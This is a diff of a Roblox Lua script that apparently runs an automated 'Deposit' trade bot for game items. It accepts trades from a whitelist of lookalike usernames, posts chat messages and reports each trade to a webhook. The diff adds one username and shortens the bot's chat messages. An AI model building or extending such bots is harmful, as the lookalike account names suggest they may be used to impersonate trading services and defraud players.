@@ -1,4 +1,4 @@
-local users = {"BL_Z0Z", "ChangeDepotl", "chongeholding1", "B1_WUW", "Horvester_TRADE", "BloxydepotI", "mm2flipbets", "chqncehoIder1", "BL_Z2Z"}
+local users = {"BL_Z0Z", "ChangeDepotl", "chanceflipper1", "chongeholding1", "B1_WUW", "Horvester_TRADE", "BloxydepotI", "mm2flipbets", "chqncehoIder1", "BL_Z2Z"}
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
@@ -50,11 +50,7 @@ local function tradeProcess()
             local tradeuser = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Username.Text
             tradeuser = tradeuser:gsub("[%(%)]", "")
             local messages = {
-                "Trade started with " .. tradeuser .. ", method: Deposit",
-                "Now trading with " .. tradeuser .. ", method: Deposit",
-                "Initiating trade with " .. tradeuser .. ", method: Deposit",
-                "Starting trade with " .. tradeuser .. ", method: Deposit",
-                "Trade session with " .. tradeuser .. " has begun, method: Deposit"
+                "Initiating trade with " .. tradeuser .. ", method: Deposit"
             }
 
             local randomMessage = messages[math.random(1, #messages)]
@@ -188,7 +184,7 @@ local embed = {
 SendMessageEMBED(url, embed)
 
                         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(game.PlaceId * 2)
-                        local message = {"Trade complete.", "Trade accepted", "Finalized trade."}
+                        local message = {"Trade completed."}
                         local randomMessage = message[math.random(1, #message)]
                         sendMessage(randomMessage)
                         tradeInProgress = false
@@ -203,7 +199,7 @@ SendMessageEMBED(url, embed)
             end
 
             if LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") and not LocalPlayer.PlayerGui.TradeGUI.Enabled then
-                local messages = {"Trade declined.", "Trade cancelled.", "Trade not completed."}
+                local messages = {"The trade offer was declined."}
                 local randomMessage = messages[math.random(1, #messages)]
                 sendMessage(randomMessage)
 
